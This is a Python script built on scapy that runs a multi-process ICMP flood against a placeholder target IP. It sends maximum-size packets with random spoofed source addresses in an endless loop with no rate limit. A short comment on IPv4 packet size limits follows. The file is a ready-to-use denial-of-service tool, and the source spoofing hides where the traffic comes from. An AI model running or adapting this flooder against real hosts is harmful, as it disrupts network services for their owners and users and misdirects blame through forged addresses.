from scapy.all import *
import multiprocessing
import random
import time
import os


TARGET = "Target_IP_Here"  # Replace with the target IP address
WORKERS = 8
PAYLOAD_SIZE = 65495 # Max practical payload (65507-12)
RATE_LIMIT = 0.0000   


class ICMPFlooder:
    def __init__(self):
        self.socket = conf.L3socket(iface=conf.iface)
        self.seq = random.randint(0, 0xFFFF)
        
    def craft_packet(self):
        return IP(dst=TARGET, 
                 src=RandIP(), 
                 id=os.getpid() & 0xFFFF)/ICMP(
                     id=os.getpid() & 0xFFFF,
                     seq=(self.seq % 0xFFFF)
                 )/Raw(load=os.urandom(PAYLOAD_SIZE))
    
    def flood(self):
        try:
            ptk=self.craft_packet()
            while True:
                self.socket.send(ptk)
                time.sleep(RATE_LIMIT)
        except Exception as e:
            print(f"Worker error: {str(e)}")

def start_workers():
    workers = []
    for _ in range(WORKERS):
        p = multiprocessing.Process(target=ICMPFlooder().flood)
        p.start()
        workers.append(p)
    return workers

if __name__ == "__main__":

    
    print(f"""\n[CONFIG]
Target: {TARGET}
Workers: {WORKERS}
Payload Size: {PAYLOAD_SIZE}B
Theoretical Rate:{"Unlimited"if RATE_LIMIT == 0.0000 else RATE_LIMIT} packets/sec
""")

    workers = start_workers()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopping workers...")
        for w in workers:
            w.terminate()
        print("[+] Test concluded")

#The IPv4 header contains a 16-bit Total Length field, capping packet size at 65,535 bytes (including headers)46.
#
#Typical header overhead:
#
#IP header: 20 bytes
#
#ICMP header: 8 bytes
#
#Maximum payload: 65,535 - 28 = 65,507 bytes

#The max size is:
#
#65507 = 65535 (max ip length) - 20 (ip hdr) - 8 (icmp/ping hdr) = 65507
#
#Windows OS blocks max size at 65500 but in Linux you can ping up to the real limit.

